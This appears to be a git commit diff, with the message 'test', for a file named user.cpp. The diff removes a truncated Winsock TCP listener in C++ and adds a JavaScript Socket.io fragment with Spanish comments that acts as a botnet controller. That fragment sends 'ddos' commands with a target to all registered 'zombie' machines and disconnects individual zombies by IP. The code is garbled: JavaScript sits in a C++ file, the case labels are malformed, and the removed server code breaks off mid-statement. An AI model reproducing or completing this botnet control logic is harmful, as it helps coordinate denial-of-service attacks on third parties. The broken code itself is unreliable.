bb150e22582d788caa252de7315bc492f8277cc5
picolasYT <nicolasguevarakraan@gmail.com>
2026-03-18 17:03:21 +0000

    test

--- user.cpp
+++ user.cpp
@@ -1,19 +1,17 @@
-#include <string>
-#include <winsock2.h>
+switch(data.command) {
+case 'ddos':
+// Enviar comando DDoS a todos los zombies registrados
+zombies.forEach(zombie => {
+io.to(zombie.id).emit('ddos', data.target);
+});
+break;
+case 'kill':
+// Eliminar un zombie específico de la lista y desconectarlo
+let targetZombie = zombies.find(zombie => zombie.ip === data.target_ip);  if (targetZombie) {      io.to(targetZombie.id).disconnect(true);    zombies = zombies.filter(zombie => zombie.id !== targetZombie.id);
+}  break;
+default:
+console.log('Comando desconocido: ' + data.command);
+}
 
-#pragma comment(lib, "ws2_32.lib")
 
-using namespace std;
-
-int main() {
-    WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);SOCKADDR_INserver;
-    server.sin_family = AF_INET;
-    server.sin_addr.s_addr = INADDR_ANY; // Escuchar en todas las interfaces de red
-    server.sin_port = htons(12345); // Puerto de escucha
-
-    bind(sock, (SOCKADDR*)&server, sizeof(server));
-    listen(sock, SOMAXCONN);
-    SOCKET client_
+});
